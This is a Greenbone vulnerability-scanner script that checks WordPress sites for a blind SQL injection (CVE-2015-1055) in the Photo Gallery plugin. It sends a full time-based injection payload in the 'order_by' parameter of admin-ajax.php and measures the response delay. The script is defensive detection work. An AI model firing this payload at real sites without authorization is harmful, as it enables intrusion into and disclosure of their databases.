# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805127");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2015-1055");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-01-20 11:04:59 +0530 (Tue, 20 Jan 2015)");
  script_name("WordPress Photo Gallery Blind SQL injection Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'Photo Gallery' is prone to blind sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the wp-admin/admin-ajax.php
  script not properly sanitizing user-supplied input to the 'order_by' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress Photo Gallery plugin version
  1.2.7, other versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 1.2.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/99922");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/72015");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129927");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jan/36");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/photo-gallery");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/photo-gallery/photo-gallery.php";
res = http_get_cache(item:url, port:port);

if(res && res =~ "^HTTP/1\.[01] 200") {
  ## Added two times, to make sure its working properly
  sleep = make_list(15000000, 25000000);
  time_taken = 0;
  wait_extra_sec = 5;

  ## Use sleep time to check we are able to execute command
  foreach sec (sleep)
  {
    url = dir + '/wp-admin/admin-ajax.php?tag_id=0&action=GalleryBox&current_view=0&'
              + 'image_id=1&gallery_id=1&theme_id=1&thumb_width=180&thumb_height=90&'
              + 'open_with_fullscreen=0&open_with_autoplay=0&image_width=800&image_h'
              + 'eight=500&image_effect=fade&sort_by=order&order_by=asc,(SELECT%20(C'
              + 'ASE%20WHEN%20(8380=8380)%20THEN%20(SELECT%20BENCHMARK(' + sec + ',MD5'
              + '(0x7a647674)))%20ELSE%208380*(SELECT%208380%20FROM%20mysql.db)%20EN'
              + 'D))&enable_image_filmstrip=1&image_filmstrip_height=70&enable_image'
              + '_ctrl_btn=1&enable_image_fullscreen=1&popup_enable_info=1&popup_inf'
              + 'o_always_show=0&popup_info_full_width=0&popup_hit_counter=0&popup_e'
              + 'nable_rate=0&slideshow_interval=5&enable_comment_social=1&enable_im'
              + 'age_facebook=1&enable_image_twitter=1&enable_image_google=1&enable_'
              + 'image_pinterest=0&enable_image_tumblr=0&watermark_type=none&current_url=p=1';

    req = http_get(item:url, port:port);

    start = unixtime();
    res = http_keepalive_send_recv(port:port, data:req);
    stop = unixtime();

    time_taken = stop - start;
    sec = sec / 5000000;

    if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(99);
  }
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
